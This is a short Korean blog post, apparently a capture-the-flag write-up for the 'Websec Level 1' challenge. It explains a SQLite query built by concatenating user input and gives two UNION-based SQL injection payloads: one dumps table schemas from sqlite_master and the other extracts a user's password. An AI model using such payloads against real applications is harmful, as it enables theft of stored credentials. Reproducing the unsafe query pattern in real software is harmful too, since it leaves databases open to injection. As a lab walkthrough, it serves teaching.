---
title : "Websec - Level 1"
excerpt : "Websec - Level 1"
toc : true
toc_sticky : true
categories :
  - Websec
tags :
  - sql injection
---
## 1. Source code
코드에서 필요한 부분만 뽑았다.

```php
$userDetails = $lo->doQuery ($_POST['user_id']); # 입력한 값을 doQuery 객체에 보내고 리턴값을 userDetails 변수에 저장함.
# doQuery 객체 코드
$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1'; # injection 변수는 매개변수임. 
```

db는 sqlite3버젼이다.  
sqlite에서  MySQL의 information_schema와 같은 역할을 하는 테이블은 sqlite_master이다.  컬럼으로는 몇개가 있었는데 필요한 컬럼은 sql컬럼이다.
sql컬럼에는 테이블 정보가 들어가있다. 

## 2. Vulnerability

SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1 이 부분에서 터진다. union을 이용한 기초적인 sql injection 문제다. 

## 3. Solution

입력를 ```1 union select 1,sql from sqlite_master -- ```라고 하면  
``` username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) ``` 이런식으로 테이블 정보가 출력된다. 
따라서 다시 입력값으로 ```1 union select 1,password from users where id=1 -- ```을 주면 플래그가 나온다.
